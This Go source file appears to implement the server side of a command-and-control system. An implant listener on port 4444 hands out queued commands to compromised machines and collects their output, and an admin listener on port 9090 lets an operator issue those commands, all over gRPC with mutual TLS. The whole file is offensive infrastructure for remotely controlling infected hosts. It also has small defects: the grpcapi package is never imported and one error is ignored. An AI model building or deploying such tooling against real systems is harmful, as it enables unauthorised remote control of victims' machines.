package main

import (
        "context"
        "crypto/tls"
        "crypto/x509"
        "fmt"
        "io/ioutil"
        "log"
        "errors"
        "net"

        "google.golang.org/grpc"
        "google.golang.org/grpc/credentials"

)

type implantServer struct {
        work, output chan *grpcapi.Command
}

type adminServer struct {
        work, output chan *grpcapi.Command
}

// Implant server handles connections from the implants
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
        s := new(implantServer)
        s.work = work
        s.output = output
        return s
}

// Admin server handles connections from the operator and doles out commands to implants
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
        s := new(adminServer)
        s.work = work
        s.output = output
        return s
}

// Handles creating a job queue for the implants that connect in
func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
        var cmd = new(grpcapi.Command)
        select {
        case cmd, ok := <-s.work:
                if ok {
                        return cmd, nil
                }
                return cmd, errors.New("channel closed")
        default:
                // No work
                return cmd, nil
        }
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
        s.output <- result
        return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
        var res *grpcapi.Command
        go func() {
                s.work <- cmd
        }()
        res = <-s.output
        return res, nil
}

func main() {
        var (
                implantListener, adminListener net.Listener
                err                            error
                //opts                           []grpc.ServerOption
                work, output                   chan *grpcapi.Command
        )  
        // These are the settings to handle mTLS. We have to load our certs
        certificate, err := tls.LoadX509KeyPair(
	"/etc/servers/certs/client-cert.pem",
	"/etc/servers/certs/client-key.pem",
	)

	certPool := x509.NewCertPool()
	bs, err := ioutil.ReadFile("/etc/servers/certs/ca-cert.pem")
	if err != nil {
		log.Fatalf("failed to read client ca cert: %s", err)
	}

	ok := certPool.AppendCertsFromPEM(bs)
	if !ok {
		log.Fatal("failed to append client certs")
	}

	tlsConfig := &tls.Config{
		ClientAuth:   tls.RequireAndVerifyClientCert,
		Certificates: []tls.Certificate{certificate},
		ClientCAs:    certPool,
	}
        
        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
        implant := NewImplantServer(work, output)
        admin := NewAdminServer(work, output)
        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
                log.Fatal(err)
        }
        if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
                log.Fatal(err)
        }
        
  // Setup the TLS config
        serverOption := grpc.Creds(credentials.NewTLS(tlsConfig))
  
  // Use the TLS config
        grpcImplantServer := grpc.NewServer(serverOption)
        grpcAdminServer := grpc.NewServer(serverOption)
        grpcapi.RegisterImplantServer(grpcImplantServer, implant)
        grpcapi.RegisterAdminServer(grpcAdminServer, admin)
        
        go func() {
                grpcImplantServer.Serve(implantListener)
        }()
        grpcAdminServer.Serve(adminListener)
}
